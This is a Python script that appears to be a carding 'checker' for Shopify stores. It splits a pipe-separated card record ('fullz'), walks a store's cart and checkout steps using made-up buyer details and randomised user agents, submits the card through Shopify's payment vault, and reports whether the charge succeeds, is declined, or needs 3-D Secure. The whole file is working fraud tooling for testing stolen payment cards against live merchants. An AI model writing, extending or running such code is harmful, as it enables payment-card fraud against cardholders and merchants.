import asyncio
import json
import random
import time
from urllib.parse import urlparse
from bs4 import BeautifulSoup
from fake_useragent import UserAgent
from FUNC.defs import *

def find_between(data, first, last):
    """Get text between two specified strings within a larger string.

    Args:
        data (str): The larger string to search within.
        first (str): The starting string to search for.
        last (str): The ending string to search for.

    Returns:
        str: The text found between the first and last strings, or None if not found.
    """
    try:
        start = data.index(first) + len(first)
        end = data.index(last, start)
        return data[start:end]
    except ValueError:
        return None 

async def create_shopify_charge(fullz , session):
    try:
        cc , mes , ano , cvv = fullz.split("|")
        cc1                 = cc[:4]
        cc2                 = cc[4:8]
        cc3                 = cc[8:12]
        cc4                 = cc[12:]
        user_agent          = UserAgent().random
        random_data         = await get_random_info(session)
        fname               = random_data["fname"]
        lname               = random_data["lname"]
        email               = random_data["email"]

        country             = "Singapore"
        address             = "799 New Upper Changi Road"
        city                = "Singapore"
        state               = "Southeast"
        state_short         = "NY"
        zip_code            ="467351"
        phone               ="6449 1636"

        deadsk    = json.loads(open("FILES/deadsk.json", "r" , encoding="utf-8").read())["AUTO_SHOPIFY_SO"]

        link = deadsk

        
        
        first_url = link
        first= await session.get(first_url)
        variantId = find_between(first.text, 'variantId":', ',')
        if not variantId:
            variantId = find_between(first.text, 'ariant-id="', '"')
        if not first or not variantId:
            return ("ERROR IN REQUEST 1")
        # print(variantId)

        bs = BeautifulSoup(first.text, 'html.parser')
        hidden_tags = bs.find_all("input", type="hidden")
        a2c_data = {
            'id': variantId,
            'quantity': 1,
        }
        for x in hidden_tags:
            if 'properties' in x.get('name'):
                a2c_data[x.get('name')] = x.get('value')
        webname = urlparse(first_url).netloc

        second = await session.post(f'https://{webname}/cart/add.js',
                        data=a2c_data,
                        headers={'x-requested-with': 'XMLHttpRequest'},
        )
        variantId = find_between(second.text, '"id":', ',')
        if not second or not variantId:
            return (second.text)
        
        third = await session.get(f'https://{webname}/checkout')
        if not third or not third.url:
            return ('ERROR IN REQUEST 1')
        
        four = await session.get(third.url)
        authenticity_token = find_between(
            four.text,
            '<input type="hidden" name="authenticity_token" value="', '"')
        if not four or not authenticity_token:
            return ("ERROR IN REQUEST 4")
        
        # print(authenticity_token)
        
        head_1 = {
            '_method': 'patch',
            'authenticity_token': authenticity_token,
            'previous_step': 'contact_information',
            'step': 'shipping_method',
            'checkout[email]': "crishniki158@gmail.com",
            'checkout[buyer_accepts_marketing]': '0',
            'checkout[buyer_accepts_marketing]': '1',
            'checkout[shipping_address][first_name]': 'Crish',
            'checkout[shipping_address][last_name]': 'Niki',
            'checkout[shipping_address][address1]': address,
            'checkout[shipping_address][address2]': '',
            'checkout[shipping_address][city]': city,
            'checkout[shipping_address][country]': country,
            'checkout[shipping_address][province]': state,
            'checkout[shipping_address][zip]': zip_code,
            'checkout[shipping_address][phone]':phone,
            'checkout[shipping_address][country]': country,
            'checkout[shipping_address][first_name]': 'Crish',
            'checkout[shipping_address][last_name]': 'Niki',
            'checkout[shipping_address][address1]': address,
            'checkout[shipping_address][address2]': '',
            'checkout[shipping_address][city]': city,
            'checkout[shipping_address][province]': state,
            'checkout[shipping_address][zip]': zip_code,
            'checkout[shipping_address][phone]':phone,
            'checkout[note]': '',
            'checkout[client_details][browser_width]': '1349',
            'checkout[client_details][browser_height]': '629',
            'checkout[client_details][javascript_enabled]': '1',
            'checkout[client_details][color_depth]': '24',
            'checkout[client_details][java_enabled]': 'false',
            'checkout[client_details][browser_tz]': '-330'
        }

        five = await session.post(third.url, data=head_1)
        if not five:
            return ('ERROR IN REQUEST 5')
        bs = BeautifulSoup(five.text, 'html.parser')
        hidden_tags = bs.find_all(
            "p", {'class': 'field__message field__message--error'})
        if hidden_tags:
            for x in hidden_tags:
                return (x.getText())
            quit()
        if 'Shipping Method' in five.text or 'Shipping method' in five.text:
            d = await session.get(str(third.url) + '/shipping_rates?step=shipping_method')
        ship_tag = find_between(
            d.text, '<div class="radio-wrapper" data-shipping-method="', '"')
        

        # print(ship_tag)

            


        
        data = {
            '_method': 'patch',
            'authenticity_token': authenticity_token,
            'previous_step': 'shipping_method',
            'step': 'payment_method',
            'checkout[shipping_rate][id]': ship_tag,
            'checkout[client_details][browser_width]': '1349',
            'checkout[client_details][browser_height]': '629',
            'checkout[client_details][javascript_enabled]': '1',
            'checkout[client_details][color_depth]': '24',
            'checkout[client_details][java_enabled]': 'false',
            'checkout[client_details][browser_tz]': '-330'
        }

        six = await session.post(third.url, data=data)
        price = find_between(six.text, '"payment_due":', '}')
        payment_gateway = find_between(six.text,
                                       'data-subfields-for-gateway="', '"')

        h = {
        'Accept': 'application/json',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'en-US,en;q=0.5',
        'Connection': 'keep-alive',
        'Content-Length': '166',
        'Content-Type': 'application/json',
        'Host': 'deposit.us.shopifycs.com',
        'Origin': 'https://checkout.shopifycs.com',
        'Referer': 'https://checkout.shopifycs.com/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-site',
        'Sec-GPC': '1',
        'User-Agent': user_agent
        }

        json_four = {
            "credit_card": {
                "number": cc,
                "name": "Crish Niki",
                "month": mes,
                "year": ano,
                "verification_value": cvv
            },
            "payment_session_scope": webname
        }

        seven = await session.post('https://deposit.us.shopifycs.com/sessions',
                       json=json_four,
                    )

        west = find_between(seven.text, '"id":"', '"')

        f_data = {
            '_method': 'patch',
            'authenticity_token': authenticity_token,
            'previous_step': 'payment_method',
            'step': '',
            's': west,
            'checkout[payment_gateway]': payment_gateway,
            'checkout[credit_card][vault]': 'false',
            'checkout[different_billing_address]': 'false',
            'checkout[remember_me]': 'false',
            'checkout[remember_me]': '0',
            'checkout[vault_phone]': "",
            'checkout[total_price]': price,
            'complete': '1',
            'checkout[client_details][browser_width]': '674',
            'checkout[client_details][browser_height]': '662',
            'checkout[client_details][javascript_enabled]': '1',
            'checkout[client_details][color_depth]': '24',
            'checkout[client_details][java_enabled]': 'false',
            'checkout[client_details][browser_tz]': '-330',
        }

        checkout_url= third.url

        f_1 = await session.post(checkout_url, data=f_data)
        nigth =await session.get(f'{checkout_url}/processing')
        g = await session.get(f'{checkout_url}/processing?from_processing_page=1')
        url_g = str(g.url)
        url_g = await session.get(url_g)



        # print(url_g.text)




        try:
            response = find_between(
                url_g.text, '<p class="notice__text">', '</p></div></div>')
            # print(response)

            if response:
                response = response
            else:
                if '3d_secure_2' in url_g.text:
                    response = 'OTP Required'
                else:
                    return url_g

        except:
            return url_g







        # try:
        #     response = find_between(url_g.text, '<p class="notice__text">', '</p></div></div>')
        #     print(response)
        # except:
        #     return response
        



        
        # print(response)

        if response is None:
            try:
                with open("FILES/result.txt", "a", encoding="UTF-8") as f:
                    f.write(f"{url_g}\n")
            except Exception as e:
                return url_g
        else:
            return response
    
    except Exception as e:
        return str(e)










